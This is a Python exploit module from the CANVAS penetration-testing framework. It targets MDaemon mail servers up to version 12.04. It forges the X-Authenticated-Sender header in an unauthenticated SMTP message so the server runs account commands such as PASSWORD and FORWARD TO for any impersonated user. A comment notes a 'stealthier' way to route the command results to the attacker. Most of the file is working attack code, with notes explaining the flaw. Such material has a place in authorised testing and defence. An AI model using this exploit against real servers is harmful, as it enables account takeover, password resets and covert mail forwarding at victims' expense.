#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

from __future__ import with_statement

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from canvasexploit import canvasexploit
from exploitutils import *

import smtplib

from contextlib import contextmanager

from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email.Utils import COMMASPACE, formatdate
from email import Encoders

NAME                    = "mdaemon_control"
DESCRIPTION             = "Remotely control an MDaemon server"
DOCUMENTATION           = {}
DOCUMENTATION['VENDOR'] = "Alt-N"

VERSION                 = "1.0"

PROPERTY                = {}
PROPERTY['TYPE']        = "Exploit"
PROPERTY['SITE']        = "Remote"
PROPERTY['ARCH']        = [ ["Windows"] ]

DOCUMENTATION["Notes"]  = """

* Overview

There exists a remote vulnerability in the Mdaemon mail server
(http://www.altn.com/Products/MDaemon-Email-Server-Windows/) that allows for unauthenticated
command control of the server. This command control allows an attacker to, among other things, reset
passwords on accounts as well as set forwarding addresses for accounts.

* Affected Systems

Mdaemon <= 12.04, excluding patch updates for 11.x branch post-12.05 release. This vulnerability was
fixed in the 12.05 branch update.

* Background

Mdaemon is a messaging server product by Alt-N technologies who describes the product as follows:

"MDaemon Messaging Server, email server software, is a trusted alternative to Microsoft Exchange or
SBS. MDaemon mail server supports IMAP, SMTP, POP3, and ActiveSync protocols and delivers
solid performance from its feature-rich and user-friendly design."

* Useful commands

PASSWORD new-password
FORWARD TO address
UNFORWARD
ACCOUNT INFO
HELP

Commands can be entered in the message body input field, one per line. The user that will be
impersonated is the originator of the email ("fromaddr" argument).

Command results will be emailed by the target mail server to "reply_to" argument, or when
omitted, to "fromaddr".

For a detailed reference on allowed commands, see:
http://www.redline-software.com/eng/support/docs/mdaemon/c28s4.php

"""

VULNERABILITY_DETAILS = """

When one sends a mail to MDaemon@FQDN, a function examines the content to look for specific
commands, and potentially execute them. It is the case for mailing lists mails (Subscribe, Unsubscribe,
etc), product activation mail, AUTH-* mails and also for a set of account configuration mails.

When a Mdaemon user wants to configure his email account, he can do so by using the web interface,
or by sending a mail with the configuration command in the subject or body of the message to the
MDAEMON@FQDN address. MDaemon checks and sets the "X-Authenticated-Sender" header on
authenticated SMTP sessions.

If the corresponding account is allowed to (by default, MDaemon allows
changes via Email), it applies any command changes specified on the authentication session.
The vulnerability is that Mdaemon does not verify if a session has actually been authenticated when
checking for the "X-Authenticated-Sender" header, and an attacker can thus execute arbitrary
configuration commands for any Mdaemon account.

These commands include the ability to reset passwords as well as install filtering and forwarding
rules for the account.

"""

TIMEOUT = 20

@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old

        
class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.port         = 25
        self.name         = NAME        
        
        self.fromaddr     = "target@company.mail"
        self.toaddr       = "MDaemon@company.mail"
        self.subject      = "Hello!"
        self.bodytext     = "Help"
        self.reply_to     = "target@company.mail"

        self.ssl          = False

    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))
        
        s = self.gettcpsock()
        
        try:
            s.connect((self.host, self.port))
        except Exception:
            self.log("No connection could be established")
            return 0
        
        return 1

    def getargs(self):
        self.port  = int(self.argsDict.get("port", self.port))
        
        self.getarg("fromaddr")
        self.getarg("toaddr")
        self.getarg("subject")
        self.getarg("bodytext")
        self.getarg("reply_to")
        self.getarg("ssl")
        
    def run(self):
        self.getargs()
        self.host  = self.target.interface

        if not self.toaddr:
            self.log('Did not specify a recipient, aborting..')
            return 0

        if not self.fromaddr:
            self.log('Did not specify a sender, aborting..')
            return 0

        self.setInfo("%s attacking %s:%d (in progress)" % (NAME, self.host, self.port))
        self.log("Sending email through %s:%d" % (self.host, self.port))

        try:
            with no_timeout_socket():
                smtp           = smtplib.SMTP(self.host, self.port, timeout=TIMEOUT)

                if self.ssl:
                    self.log('Using SSL with STARTTLS')
                    smtp.starttls()
            
                msg            = MIMEMultipart()
                msg['From']    = self.fromaddr
                msg['To']      = self.toaddr
                msg['Date']    = formatdate()
                msg['X-Authenticated-Sender'] = self.fromaddr
                msg['Subject'] = self.subject

                if self.reply_to != self.fromaddr:
                    # This is a stealthier way to get the command replies
                    # compared to using the Reply-To header
                    self.bodytext = 'RESULTS TO %s\n%s' % (self.reply_to, self.bodytext)
                else:
                    self.bodytext = 'RESULTS TO %s\n%s' % (self.fromaddr, self.bodytext)
                
                msg.attach(MIMEText(self.bodytext))
                self.log(msg.as_string())

                smtp.sendmail(self.fromaddr, self.toaddr, msg.as_string())
                smtp.quit()
        except Exception, ex:
            self.log('Error: %s' % ex)
            self.setInfo("%s - done (failure)" % (NAME))
            return 0

        self.setInfo("%s - done (success)" % (NAME))
        return 1

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
